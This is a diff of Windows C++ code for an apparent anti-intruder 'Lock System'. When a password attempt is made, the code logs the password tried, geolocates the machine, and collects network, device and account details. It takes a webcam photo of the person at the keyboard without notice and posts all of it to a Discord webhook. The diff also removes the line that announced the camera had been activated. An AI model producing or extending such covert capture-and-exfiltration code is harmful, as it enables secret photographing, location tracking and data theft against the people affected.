@@ -3,10 +3,7 @@
 #include <string>
 #include <cstring>
 #include <vector>
-#include <objidl.h>
-#include <gdiplus.h>
 #pragma comment(lib, "wininet.lib")
-#pragma comment(lib, "gdiplus.lib")
 
 static const char* WH_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
 
@@ -71,7 +68,7 @@ inline std::string GetWebhookPath() {
     return (ps != std::string::npos) ? url.substr(ps) : "/";
 }
 
-// ===== Command Runner =====
+// ===== Command & HTTP =====
 
 inline std::string RunCmd(const std::string& cmd) {
     SECURITY_ATTRIBUTES sa = {}; sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
@@ -184,120 +181,95 @@ inline std::string GetPowerInfo() {
     return "N/A";
 }
 
-// ===== BMP to JPEG Converter (GDI+) =====
+// ===== JSON Embed Builder =====
 
-inline bool ConvertBmpToJpeg(const std::string& bmpPath, const std::string& jpgPath) {
-    Gdiplus::GdiplusStartupInput si;
-    ULONG_PTR token;
-    if (Gdiplus::GdiplusStartup(&token, &si, NULL) != Gdiplus::Ok) return false;
+inline void JAddField(std::string& json, const char* name, const std::string& value, bool isInline = false) {
+    char q = '"';
+    if (!json.empty() && json.back() != '[') json += ',';
+    json += '{';
+    json += q; json += "name"; json += q; json += ':';
+    json += q; json += JEsc(std::string(name)); json += q; json += ',';
+    json += q; json += "value"; json += q; json += ':';
+    json += q; json += JEsc(value); json += q;
+    if (isInline) { json += ','; json += q; json += "inline"; json += q; json += ":true"; }
+    json += '}';
+}
 
-    wchar_t wBmp[MAX_PATH], wJpg[MAX_PATH];
-    MultiByteToWideChar(CP_ACP, 0, bmpPath.c_str(), -1, wBmp, MAX_PATH);
-    MultiByteToWideChar(CP_ACP, 0, jpgPath.c_str(), -1, wJpg, MAX_PATH);
+// ===== Discord Sender =====
 
+inline bool PostToDiscord(const std::string& json) {
+    std::string whPath = GetWebhookPath();
     bool ok = false;
-    Gdiplus::Bitmap* bmp = new Gdiplus::Bitmap(wBmp);
-    if (bmp->GetLastStatus() == Gdiplus::Ok) {
-        UINT num = 0, sz = 0;
-        Gdiplus::GetImageEncodersSize(&num, &sz);
-        if (sz > 0) {
-            Gdiplus::ImageCodecInfo* codecs = (Gdiplus::ImageCodecInfo*)malloc(sz);
-            Gdiplus::GetImageEncoders(num, sz, codecs);
-            for (UINT i = 0; i < num; i++) {
-                if (wcscmp(codecs[i].MimeType, L"image/jpeg") == 0) {
-                    Gdiplus::EncoderParameters ep;
-                    ep.Count = 1;
-                    ep.Parameter[0].Guid = Gdiplus::EncoderQuality;
-                    ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
-                    ep.Parameter[0].NumberOfValues = 1;
-                    ULONG quality = 80;
-                    ep.Parameter[0].Value = &quality;
-                    ok = (bmp->Save(wJpg, &codecs[i].Clsid, &ep) == Gdiplus::Ok);
-                    break;
-                }
+    HINTERNET h1 = InternetOpenA(WH_UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (h1) {
+        HINTERNET h2 = InternetConnectA(h1, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
+            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (h2) {
+            DWORD fl = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
+            HINTERNET h3 = HttpOpenRequestA(h2, "POST", whPath.c_str(), NULL, NULL, NULL, fl, 0);
+            if (h3) {
+                const char* hdr = "Content-Type: application/json\r\n";
+                ok = HttpSendRequestA(h3, hdr, -1, (LPVOID)json.c_str(), (DWORD)json.size()) != 0;
+                InternetCloseHandle(h3);
             }
-            free(codecs);
+            InternetCloseHandle(h2);
         }
+        InternetCloseHandle(h1);
     }
-    delete bmp;
-    Gdiplus::GdiplusShutdown(token);
     return ok;
 }
 
-// ===== Webcam Capture: Method 1 - Native VFW (no ffmpeg needed) =====
-
-// VFW message constants (avoid UNICODE issues with macros)
-#define VFW_CAP_CONNECT      (WM_USER + 10)
-#define VFW_CAP_DISCONNECT   (WM_USER + 11)
-#define VFW_CAP_SAVEDIB_A    (WM_USER + 25)
-#define VFW_CAP_GRAB_FRAME   (WM_USER + 60)
-
-typedef HWND (WINAPI *fnCapCreateCaptureWindowA)(
-    LPCSTR, DWORD, int, int, int, int, HWND, int);
-
-inline std::string CaptureWebcamNative() {
-    char tempDir[MAX_PATH];
-    GetTempPathA(MAX_PATH, tempDir);
-    std::string bmpPath = std::string(tempDir) + "intruder_cap.bmp";
-    std::string jpgPath = std::string(tempDir) + "intruder_capture.jpg";
-    DeleteFileA(bmpPath.c_str());
-    DeleteFileA(jpgPath.c_str());
-
-    HMODULE hAvi = LoadLibraryA("avicap32.dll");
-    if (!hAvi) return "";
-
-    fnCapCreateCaptureWindowA pCreate =
-        (fnCapCreateCaptureWindowA)GetProcAddress(hAvi, "capCreateCaptureWindowA");
-    if (!pCreate) { FreeLibrary(hAvi); return ""; }
-
-    HWND hCap = pCreate("c", WS_CHILD, 0, 0, 320, 240, GetDesktopWindow(), 0);
-    if (!hCap) { FreeLibrary(hAvi); return ""; }
-
-    bool connected = false;
-    for (int i = 0; i < 10; i++) {
-        if (SendMessage(hCap, VFW_CAP_CONNECT, (WPARAM)i, 0L)) {
-            connected = true;
-            Sleep(500);
-            break;
-        }
-    }
-
-    if (connected) {
-        SendMessage(hCap, VFW_CAP_GRAB_FRAME, 0, 0L);
-        Sleep(300);
-        SendMessageA(hCap, VFW_CAP_SAVEDIB_A, 0, (LPARAM)bmpPath.c_str());
-        SendMessage(hCap, VFW_CAP_DISCONNECT, 0, 0L);
-    }
-
-    DestroyWindow(hCap);
-    FreeLibrary(hAvi);
-
-    if (GetFileAttributesA(bmpPath.c_str()) == INVALID_FILE_ATTRIBUTES) return "";
-
-    // Convert BMP to JPEG
-    if (ConvertBmpToJpeg(bmpPath, jpgPath)) {
-        DeleteFileA(bmpPath.c_str());
-        HANDLE hf = CreateFileA(jpgPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-        if (hf == INVALID_HANDLE_VALUE) return "";
-        DWORD sz = GetFileSize(hf, NULL);
-        CloseHandle(hf);
-        if (sz < 1000) { DeleteFileA(jpgPath.c_str()); return ""; }
-        return jpgPath;
-    }
-
-    // Fallback: send BMP directly
-    DeleteFileA(jpgPath.c_str());
-    HANDLE hf = CreateFileA(bmpPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (hf == INVALID_HANDLE_VALUE) return "";
+inline bool PostToDiscordWithFile(const std::string& json, const std::string& filePath, const std::string& fileName, const std::string& mime) {
+    std::string whPath = GetWebhookPath();
+    // Read file
+    HANDLE hf = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return false;
     DWORD sz = GetFileSize(hf, NULL);
+    if (sz < 100 || sz > 8000000) { CloseHandle(hf); return false; }
+    std::vector<char> fileData(sz); DWORD br;
+    ReadFile(hf, fileData.data(), sz, &br, NULL);
     CloseHandle(hf);
-    if (sz < 1000) { DeleteFileA(bmpPath.c_str()); return ""; }
-    return bmpPath;
+
+    std::string bnd = "----FormBoundary7MA4YWxk9Z";
+    std::string body;
+    body += "--" + bnd + "\r\n";
+    body += "Content-Disposition: form-data; name=\"payload_json\"\r\n";
+    body += "Content-Type: application/json; charset=utf-8\r\n\r\n";
+    body += json + "\r\n";
+    body += "--" + bnd + "\r\n";
+    body += "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + fileName + "\"\r\n";
+    body += "Content-Type: " + mime + "\r\n\r\n";
+    std::string footer = "\r\n--" + bnd + "--\r\n";
+
+    std::vector<char> fullBody;
+    fullBody.insert(fullBody.end(), body.begin(), body.end());
+    fullBody.insert(fullBody.end(), fileData.begin(), fileData.end());
+    fullBody.insert(fullBody.end(), footer.begin(), footer.end());
+
+    bool ok = false;
+    HINTERNET h1 = InternetOpenA(WH_UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (h1) {
+        HINTERNET h2 = InternetConnectA(h1, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
+            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (h2) {
+            DWORD fl = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
+            HINTERNET h3 = HttpOpenRequestA(h2, "POST", whPath.c_str(), NULL, NULL, NULL, fl, 0);
+            if (h3) {
+                std::string hdr = "Content-Type: multipart/form-data; boundary=" + bnd + "\r\n";
+                ok = HttpSendRequestA(h3, hdr.c_str(), (DWORD)hdr.size(),
+                    fullBody.data(), (DWORD)fullBody.size()) != 0;
+                InternetCloseHandle(h3);
+            }
+            InternetCloseHandle(h2);
+        }
+        InternetCloseHandle(h1);
+    }
+    return ok;
 }
 
-// ===== Webcam Capture: Method 2 - ffmpeg (if installed) =====
+// ===== Webcam Capture (ffmpeg only, no extra dependencies) =====
 
-inline std::string CaptureWebcamFFmpeg() {
+inline std::string CaptureWebcam() {
     char tempDir[MAX_PATH];
     GetTempPathA(MAX_PATH, tempDir);
     std::string photoPath = std::string(tempDir) + "intruder_capture.jpg";
@@ -353,57 +325,14 @@ inline std::string CaptureWebcamFFmpeg() {
     if (hf == INVALID_HANDLE_VALUE) return "";
     DWORD sz = GetFileSize(hf, NULL);
     CloseHandle(hf);
-    if (sz < 1000) { DeleteFileA(photoPath.c_str()); return "";  }
+    if (sz < 1000) { DeleteFileA(photoPath.c_str()); return ""; }
     return photoPath;
 }
 
-// ===== Combined Webcam Capture =====
+// ===== Build Embed JSON =====
 
-inline std::string CaptureWebcam() {
-    // Method 1: Native VFW (works without ffmpeg)
-    std::string photo = CaptureWebcamNative();
-    if (!photo.empty()) return photo;
-
-    // Method 2: ffmpeg (if installed)
-    return CaptureWebcamFFmpeg();
-}
-
-// ===== File Reader =====
-
-inline std::vector<char> ReadFileBytes(const std::string& path) {
-    std::vector<char> data;
-    HANDLE h = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (h == INVALID_HANDLE_VALUE) return data;
-    DWORD sz = GetFileSize(h, NULL);
-    data.resize(sz); DWORD br;
-    ReadFile(h, data.data(), sz, &br, NULL);
-    CloseHandle(h);
-    return data;
-}
-
-// ===== JSON Embed Builder =====
-
-inline void JAddField(std::string& json, const char* name, const std::string& value, bool isInline = false) {
-    char q = '"';
-    if (!json.empty() && json.back() != '[') json += ',';
-    json += '{';
-    json += q; json += "name"; json += q; json += ':';
-    json += q; json += JEsc(std::string(name)); json += q; json += ',';
-    json += q; json += "value"; json += q; json += ':';
-    json += q; json += JEsc(value); json += q;
-    if (isInline) { json += ','; json += q; json += "inline"; json += q; json += ":true"; }
-    json += '}';
-}
-
-// ===== Main Webhook Thread =====
-
-struct WH_Data { std::string key, pc, usr; };
-
-inline DWORD WINAPI DirectWebhookThread(LPVOID p) {
-    WH_Data* d = (WH_Data*)p;
-    std::string whPath = GetWebhookPath();
-
-    // Gather all system info
+inline std::string BuildEmbedJson(const std::string& key, const std::string& pc, const std::string& usr, bool hasPhoto = false) {
+    // Gather info
     std::string geoJson = HttpGet("ip-api.com", "/json");
     std::string publicIp = JsonVal(geoJson, "query");
     std::string isp = JsonVal(geoJson, "isp");
@@ -422,47 +351,28 @@ inline DWORD WINAPI DirectWebhookThread(LPVOID p) {
     if (isp.empty()) isp = "N/A";
     if (org.empty()) org = isp;
 
-    // Capture webcam
-    std::string photoPath = CaptureWebcam();
-    bool hasPhoto = !photoPath.empty();
-
-    // Detect file extension for content type
-    std::string photoFileName = "intruder_capture.jpg";
-    std::string photoMime = "image/jpeg";
-    if (hasPhoto && photoPath.find(".bmp") != std::string::npos) {
-        photoFileName = "intruder_capture.bmp";
-        photoMime = "image/bmp";
-    }
-
-    // Build embed JSON
     char q = '"';
     std::string fields;
+    JAddField(fields, "Mat khau ke xam nhap vua thu", "`" + key + "`");
 
-    // Field: Password
-    JAddField(fields, "Mat khau ke xam nhap vua thu", "`" + d->key + "`");
-
-    // Field: Location
     std::string locVal = "**ISP:** " + isp + " (" + org + ")\n";
     locVal += "**Vi tri:** " + city + ", " + region + ", " + country + "\n";
     if (!lat.empty() && !lon.empty())
         locVal += "**Ban do:** [Xem toa do Google Maps](https://www.google.com/maps?q=" + lat + "," + lon + ")";
     JAddField(fields, "Vi tri & Nha mang (ISP)", locVal);
 
-    // Field: Network
     std::string netVal = "**Wi-Fi SSID:** " + ssid + "\n";
     netVal += "**IP Cong khai:** " + publicIp + "\n";
     netVal += "**IP Cuc bo (LAN):** " + localIp + "\n";
     netVal += "**Gateway:** " + gateway;
     JAddField(fields, "Ket noi mang", netVal, true);
 
-    // Field: Device
-    std::string devVal = "**May tinh:** " + d->pc + "\n";
-    devVal += "**Tai khoan:** " + d->usr + "\n";
+    std::string devVal = "**May tinh:** " + pc + "\n";
+    devVal += "**Tai khoan:** " + usr + "\n";
     devVal += "**Nguon dien:** " + powerInfo + "\n";
     devVal += "**Thoi diem:** " + timestamp;
     JAddField(fields, "Thiet bi & Phien lam viec", devVal, true);
 
-    // Build full JSON
     std::string json;
     json += '{';
     json += q; json += "username"; json += q; json += ':';
@@ -470,16 +380,13 @@ inline DWORD WINAPI DirectWebhookThread(LPVOID p) {
     json += q; json += "embeds"; json += q; json += ":[{";
     json += q; json += "title"; json += q; json += ':';
     json += q; json += "CANH BAO: PHAT HIEN TRUY CAP TRAI PHEP!"; json += q; json += ',';
-    json += q; json += "description"; json += q; json += ':';
-    if (hasPhoto)
-        json += q; json += "Camera thiet bi da duoc kich hoat ghi hinh."; json += q; json += ',';
     json += q; json += "color"; json += q; json += ":15158332,";
     json += q; json += "fields"; json += q; json += ":[" + fields + "]";
 
     if (hasPhoto) {
         json += ','; json += q; json += "image"; json += q; json += ":{";
         json += q; json += "url"; json += q; json += ':';
-        json += q; json += "attachment://"; json += photoFileName; json += q; json += '}';
+        json += q; json += "attachment://intruder_capture.jpg"; json += q; json += '}';
     }
 
     json += ','; json += q; json += "footer"; json += q; json += ":{";
@@ -487,53 +394,29 @@ inline DWORD WINAPI DirectWebhookThread(LPVOID p) {
     json += q; json += "ID: SEC-ALERT-911 | Tu dong ghi lai boi Lock System"; json += q; json += '}';
     json += "}]}";
 
-    // Send to Discord
-    HINTERNET h1 = InternetOpenA(WH_UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (h1) {
-        HINTERNET h2 = InternetConnectA(h1, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
-            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-        if (h2) {
-            DWORD fl = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
-            HINTERNET h3 = HttpOpenRequestA(h2, "POST", whPath.c_str(), NULL, NULL, NULL, fl, 0);
-            if (h3) {
-                if (hasPhoto) {
-                    std::vector<char> fileData = ReadFileBytes(photoPath);
-                    if (!fileData.empty()) {
-                        std::string bnd = "----FormBoundary7MA4YWxk9Z";
-                        std::string body;
-                        body += "--" + bnd + "\r\n";
-                        body += "Content-Disposition: form-data; name=\"payload_json\"\r\n";
-                        body += "Content-Type: application/json; charset=utf-8\r\n\r\n";
-                        body += json + "\r\n";
-                        body += "--" + bnd + "\r\n";
-                        body += "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + photoFileName + "\"\r\n";
-                        body += "Content-Type: " + photoMime + "\r\n\r\n";
-                        std::string footer = "\r\n--" + bnd + "--\r\n";
+    return json;
+}
 
-                        std::vector<char> fullBody;
-                        fullBody.insert(fullBody.end(), body.begin(), body.end());
-                        fullBody.insert(fullBody.end(), fileData.begin(), fileData.end());
-                        fullBody.insert(fullBody.end(), footer.begin(), footer.end());
+// ===== Main Thread =====
 
-                        std::string hdr = "Content-Type: multipart/form-data; boundary=" + bnd + "\r\n";
-                        HttpSendRequestA(h3, hdr.c_str(), (DWORD)hdr.size(),
-                            fullBody.data(), (DWORD)fullBody.size());
-                    } else {
-                        const char* hdr = "Content-Type: application/json\r\n";
-                        HttpSendRequestA(h3, hdr, -1, (LPVOID)json.c_str(), (DWORD)json.size());
-                    }
-                } else {
-                    const char* hdr = "Content-Type: application/json\r\n";
-                    HttpSendRequestA(h3, hdr, -1, (LPVOID)json.c_str(), (DWORD)json.size());
-                }
-                InternetCloseHandle(h3);
-            }
-            InternetCloseHandle(h2);
-        }
-        InternetCloseHandle(h1);
+struct WH_Data { std::string key, pc, usr; };
+
+inline DWORD WINAPI DirectWebhookThread(LPVOID p) {
+    WH_Data* d = (WH_Data*)p;
+
+    // STEP 1: Send text embed IMMEDIATELY (guaranteed delivery)
+    std::string jsonNoPhoto = BuildEmbedJson(d->key, d->pc, d->usr, false);
+    PostToDiscord(jsonNoPhoto);
+
+    // STEP 2: Try webcam capture (best effort, no crash risk)
+    std::string photoPath = CaptureWebcam();
+    if (!photoPath.empty()) {
+        // Send a SECOND message with the photo attached
+        std::string jsonWithPhoto = BuildEmbedJson(d->key, d->pc, d->usr, true);
+        PostToDiscordWithFile(jsonWithPhoto, photoPath, "intruder_capture.jpg", "image/jpeg");
+        DeleteFileA(photoPath.c_str());
     }
 
-    if (hasPhoto) DeleteFileA(photoPath.c_str());
     delete d;
     return 0;
 }
